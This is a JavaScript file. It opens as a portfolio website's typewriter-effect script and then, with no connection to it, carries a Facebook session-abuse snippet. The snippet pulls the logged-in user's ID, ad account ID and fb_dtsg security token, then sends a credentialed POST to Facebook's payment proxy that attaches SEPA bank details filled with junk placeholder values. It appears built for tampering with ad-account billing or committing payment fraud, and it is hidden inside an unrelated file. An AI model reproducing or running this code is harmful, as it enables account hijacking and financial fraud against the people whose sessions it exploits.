let nav = document.querySelector('nav').clientHeight;
let content = document.querySelector('.interface');
content.style.height = window.innerHeight - nav + 'px';

let textTest = '';
let myWords = 'I am Full Stack Developer, Worked on many large projects, If you want anything contact with me.';

let el = document.querySelector('.myParagraph');
let currrent = 0;
window.onload = function () {

    let typeWriter = setInterval(() => {
        el.textContent += myWords[currrent];
        currrent++;
        if(currrent > myWords.length - 1) {
            clearInterval(typeWriter);   
        }
        
    },100)
}





var accountId = require("BusinessUnifiedNavigationContext").adAccountID;
var fb_dtsg = require('DTSGInitialData').token;
var __user = require('CurrentUserInitialData').USER_ID;


fetch(`https://secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F`, {
    "headers": {
        "content-type": "application/x-www-form-urlencoded",
    },
    "body": `av=100090950243422&payment_dev_cycle=prod&__usid=6-Trrqa2qm23w3j%3APrrqanz1mrv6gr%3A0-Arrq9t5183f1d1-RV%3D6%3AF%3D&__user=100090950243422&__a=1&__dyn=7AzHxqU5a9zk1ryaxG4VuC0BVU98nwgUaqwh8KbgS3qi7UK367EfEf8boG4E767Qcyo5S3y4o0B-q7oc81xoswIK1Rwwwqo465o-cw5Mx62G5UswoEcE4O2-2l2Utwwwi831wnEforK3m1mzXw8W58jwGzE8FU766FobrwKxm5oe85nxm16Cwaam7-2K3y3q1GxWm4UpCwLyES0Io5d0sUowMwBwBwzwTwNxe6Uak1xwJwxyo6O&__req=3j&__hs=19434.HYP%3Acomet_pkg.2.1..2.1&dpr=1&__ccg=EXCELLENT&__rev=1007136465&__s=ykl66t%3A2p4gi6%3An0beqo&__hsi=7211951299572564245&__comet_req=15&fb_dtsg=NAcOcTO1m7CEf_-oY9MgMNuxRDqlXjVWvw8AWr88rWzRWp_RITQMoHA%3A10%3A1679155555&jazoest=25498&lsd=EsBSofUoOeg4I1rq3aouSO&__aaid=1394164407789975&__spin_r=1007136465&__spin_b=trunk&__spin_t=1679163263&qpl_active_flow_ids=1056839232&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingDirectDebitSEPAMutation&variables=%7B%22input%22%3A%7B%22account_holder_name%22%3A%22dsaasd%22%2C%22account_number_last_four%22%3A%223953%22%2C%22approval%22%3Atrue%2C%22bank_account_number%22%3A%7B%22sensitive_string_value%22%3A%22BE53485276823953%22%7D%2C%22bank_address%22%3A%7B%22city%22%3A%22sdada%22%2C%22country_code%22%3A%22BE%22%2C%22postal_code%22%3A%229992%22%2C%22street_address%22%3A%22saddsadsa%22%7D%2C%22bank_code%22%3A%22KREDBEBB%22%2C%22geo_type%22%3A%22SEPA%22%2C%22logging_data%22%3A%7B%22logging_counter%22%3A18%2C%22logging_id%22%3A%22874533271%22%7D%2C%22payment_account_id%22%3A%221583935822113196%22%2C%22actor_id%22%3A%22100090950243422%22%2C%22client_mutation_id%22%3A%221%22%7D%7D&server_timestamps=true&doc_id=3735419516582761&fb_api_analytics_tags=%5B%22qpl_active_flow_ids%3D1056839232%22%5D`,
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
}).then(e => { 
    
    console.log('Done')

    })




